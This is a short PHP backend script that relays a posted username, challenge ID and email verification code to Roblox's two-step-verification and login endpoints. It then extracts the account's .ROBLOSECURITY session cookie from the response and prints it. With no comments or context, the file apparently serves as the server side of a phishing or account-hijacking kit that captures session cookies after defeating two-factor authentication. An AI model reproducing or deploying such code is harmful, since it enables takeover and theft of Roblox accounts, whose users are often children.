<?php
include('../function.php');
if($_SERVER['REQUEST_METHOD'] == "POST"){
	$csrf = get_csrf();
	$id = requestId($_POST['username']);
	$tl = $_POST['tl'];
	$code = $_POST['verification-code'];
	$arrayData = array(
	'challengeId' => $tl,
	'actionType' => "Login",
	'code' => $code
	);
	$postData = json_encode($arrayData);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://twostepverification.roblox.com/v1/users/$id/challenges/email/verify");
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('x-csrf-token:'.$csrf, 'Content-Type: application/json;charset=UTF-8'));
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$output = curl_exec($ch);
	curl_close($ch);
	preg_match("/(?={)(.*)/", $output, $json);
	if(strpos($json[0], '"errors":')){
		$outputDecode = json_decode($json[0]);
		echo $outputDecode->errors[0]->message;
	}
	else{
		if(strpos($json[0], '"verificationToken"')){
			$outputDecode = json_decode($json[0]);
			$verifToken = $outputDecode->verificationToken;
			$arrayData = array(
			'challengeId' => $tl,
			'verificationToken' => $verifToken,
			'rememberDevice' => "false"
			);
			$postData = json_encode($arrayData);
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v3/users/$id/two-step-verification/login");
			curl_setopt($ch, CURLOPT_HTTPHEADER, array('x-csrf-token:'.$csrf, 'Content-Type: application/json;charset=UTF-8'));
			curl_setopt($ch, CURLOPT_HEADER, 1);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			$output = curl_exec($ch);
			curl_close($ch);
			if(strpos($output, 'set-cookie: .ROBLOSECURITY=')){
				preg_match("/(?<=set-cookie: .ROBLOSECURITY=)(.*?)(?=;)/", $output, $cookie);
				echo $cookie[0];
			}
		}
	}
}
?>
